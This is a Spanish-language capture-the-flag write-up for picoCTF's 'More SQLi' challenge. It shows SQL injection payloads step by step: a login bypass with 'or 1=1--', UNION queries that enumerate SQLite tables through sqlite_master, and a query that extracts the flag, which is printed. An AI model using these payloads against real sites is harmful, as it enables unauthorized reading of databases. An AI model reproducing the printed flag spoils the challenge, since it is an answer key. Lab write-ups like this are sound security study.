# More SQLi

## Descripcion
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:53303/).
## Solucion
Vamos al link que nos da el reto y probamos con credenciales para logging basicas como `username:admin; password:admin`
Y despues de hacer esto, vemos que el sitio nos dice como es que se esta devolviendo la consulta:
```
username: admin
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'
```
Entonces para generar nuestra SQL inyection debemos de hacerlo en el password en lugar del username:

```
username: adsasd
password: asd' or 1=1--
```

Vemos que ahora tenemos otro campo de City, y al probar a buscar algo que no existe no regresa nada, pero hay una columna que nos dice `Maybe all the tables` lo que nos da una pista de necesitamos ver mas tablas.
Probamos a inyectar código SQL en el campo de City y vemos que funciona:
```sql
flag' or 1=1--
```
Preparamos nuestra query con los datos que teníamos de que existe una tabla llamada users

```sql
flag' or 1=1 UNION Select * from users--
```

Vemos que esta nos regresa una nueva columna con los datos del administrador
`| admin | moreRandOMN3ss | 1`
Pero parece ser que no sirve de nada
Ahora la pista que nos dan es que tenemos un SQLite por lo que en SQLite hay una forma de poder consultar los datos de las tablas.

```sql
flag' UNION SELECT name, null, null from sqlite_master WHERE type='table';
```

Buscando mas documentación nos encontramos con que podemos también consultar el nombre de las columnas con la columna sql de la tabla sqlite_master.

```sql
flag' UNION SELECT name, sql, null from sqlite_master WHERE type='table';
```

Nos regresa lo siguiente:

| City       | Address                                                                                     | Phone |
| ---------- | ------------------------------------------------------------------------------------------- | ----- |
| hints      | CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)                             |       |
| more_table | CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)                        |       |
| offices    | CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT) |       |
| users      | CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)              |       |

Vemos que la tabla `more_table` tiene una columna llamada flag, entonces ahora solo tenemos que hacer una consulta a la tabla more_table para saber esta:

```sql
flag' UNION SELECT id, flag, null FROM more_table;
```

Finalmente obtenemos nuestra flag:
```flag
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}
```

Todo esto se puede hacer porque las columnas de la tabla offices son de tipo text y pueden regresar valores de tipo int tambien.

## Notas adicionales

## Referencias
